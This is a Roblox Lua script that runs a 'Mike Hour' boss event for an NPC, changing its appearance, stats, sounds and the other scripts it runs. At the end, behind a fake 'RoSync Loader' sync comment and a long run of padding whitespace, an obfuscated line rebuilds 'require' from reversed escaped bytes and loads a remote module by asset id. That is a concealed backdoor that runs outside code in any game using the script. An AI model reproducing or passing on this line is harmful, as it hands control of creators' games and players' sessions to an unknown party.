local Character = script.Parent
local TweenService = game:GetService("TweenService")
local Info1 = TweenInfo.new(20,Enum.EasingStyle.Cubic,Enum.EasingDirection.InOut)
local faceenabling = TweenService:Create(script.Parent.Head.face.manface,Info1,{Transparency = 0.5})
local santahatcreate = TweenService:Create(script.Parent.Head.santahat,Info1,{Transparency = 0})
local haircreate = TweenService:Create(script.Parent.Head.hair,Info1,{Transparency = 0})
local eye1 = TweenService:Create(script.Parent.Head.Eye1,Info1,{Color = Color3.fromRGB(120, 0, 255)})
local eye2 = TweenService:Create(script.Parent.Head.Eye2,Info1,{Color = Color3.fromRGB(120, 0, 255)})
local Humanoid = Character:WaitForChild("NPC")
local Awake2 = Humanoid:LoadAnimation(script.Parent.AwakeMH)
local Trap = script.Parent["Right Leg"].BeartrapPart

local RakeHumanoid = script.Parent.NPC
local AlreadyBloodHour = false
local Torso = script.Parent.Torso
local Head = script.Parent.Head
local MainScript = script.Parent.MainScript
local NHMainScript = script.Parent.MHMainScript
local NightmareHourText = workspace.MikeHourText
local NightmareHourFunction = workspace.MikeHourFunction
local SoundSetup = workspace.SoundSetup
local Wander = script.Parent.Wander
local Lighting = game.Lighting
local Stun = script.Parent.Stun
local Stun2 = script.Parent.Stun2
local NHStun = script.Parent.MHStun
local NHStun2 = script.Parent.MHStun2

workspace.Values.MikeHour.Changed:Connect(function()
	if workspace.Values.MikeHour.Value == true then
		workspace.NearMode.ModeStarted.Value = true
		
		workspace.Values.DuringMode.Value = true
		if script.Parent.Configuration.StunTime.Value > 0 then
			wait(4)
			script.Parent.Configuration.StunTime.Value = 0
		end
		workspace.Values.BadgeAwards.AwardMikeBadge.Value = true
		SoundSetup.lol:Play()
	SoundSetup.MikeHourSound:Play()
		script.Parent.DisableUvBlind.Disabled = false
		workspace.StopTheme.Value = true
		Stun.Disabled = true
		Stun2.Disabled = true
		workspace.MikeHourDebounce.Value = true
		script.Parent.RetreatScript.Disabled = true
		script.Parent.RetreatScript2.Disabled = true
		script.Parent.RandomBloodHour.Disabled = true
		script.Parent.RandomShadowHour.Disabled = true
		script.Parent.RandomNightmareHour.Disabled = true
		workspace.PowerOutValue.Value = 1
		workspace.MikeHourFog.Value = 1
		AlreadyBloodHour = true
		workspace.Trapped.Value = true
		script.Parent.Configuration.Damage.Value = 60
		MainScript.Disabled = true
		Wander.Disabled = true
	
		NHStun.Disabled = true
		NHStun2.Disabled = true
		script.Parent.Stunning.Value = false
		workspace.Stunned.Value = 0
		workspace.StopMoving.Value = true
		script.parent.RagdollPart1.CanCollide = false
		script.parent.RagdollPart2.CanCollide = false
		script.parent.RagdollPart3.CanCollide = false
		script.parent.RagdollPart4.CanCollide = false
		script.Parent.RagdollPart5.CanCollide = false
		script.parent.Torso["Neck"].Part1=script.parent.Head
		script.parent.Torso["Left Hip"].Part1=script.parent["Left Leg"]
		script.parent.Torso["Right Hip"].Part1=script.parent["Right Leg"]
		script.parent.Torso["Left Shoulder"].Part1=script.parent["Left Arm"]
		script.parent.Torso["Right Shoulder"].Part1=script.parent["Right Arm"]
		script.Parent.Configuration.StunTime.Value = 0
		script.Parent.NPC.PlatformStand = false
		script.Parent.DamageScript.Disabled = false
		script.Parent.HeavyDamageScript.Disabled = false
		script.Parent.NHMainScript.Disabled = false
		workspace.DayTimeSong1:Stop()
		workspace.DayTimeSong2:Stop()
		workspace.DayTimeSong3:Stop()
		workspace.DayTimeSong4:Stop()
		Awake2:Play()
		Awake2:AdjustSpeed(0.6+(math.random()*0.1))
		haircreate:Play()
		santahatcreate:Play()
		haircreate:Play()
		eye1:Play()
		eye2:Play()
		NHMainScript.Disabled = false
		NightmareHourFunction.Value = true
		workspace.Trapped.Value = false
		script.Parent.NPC.MaxHealth = 11500
		wait()
		script.Parent.NPC.Health = 11500
		wait(38)
		NightmareHourText.Value = true
		wait(2)
		NightmareHourText.Value = false
		workspace.Values.BadgeAwards.AwardMikeBadge.Value = false
		local raandom = math.random(1,2)
		if raandom == 1 then
			SoundSetup.MikeHourChasingSound:Play()
		elseif raandom == 2 then
			SoundSetup.MikeHourChasingSound2:Play()
		end
		workspace.StopMoving.Value = false
		script.Parent.Configuration.WalkSpeed.Value = 12
		script.Parent.Configuration.RunSpeed.Value = 55
		--script.Parent.Head.NightmareScreaming:Play()
		Awake2:Stop()
		Wander.Disabled = false
		wait(170)
		script.Parent:FindFirstChildOfClass("Humanoid").Health = 0
end
	end)
--[[ Last synced 7/24/2021 12:28                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5722947559) --[[                                                                                                  ]]--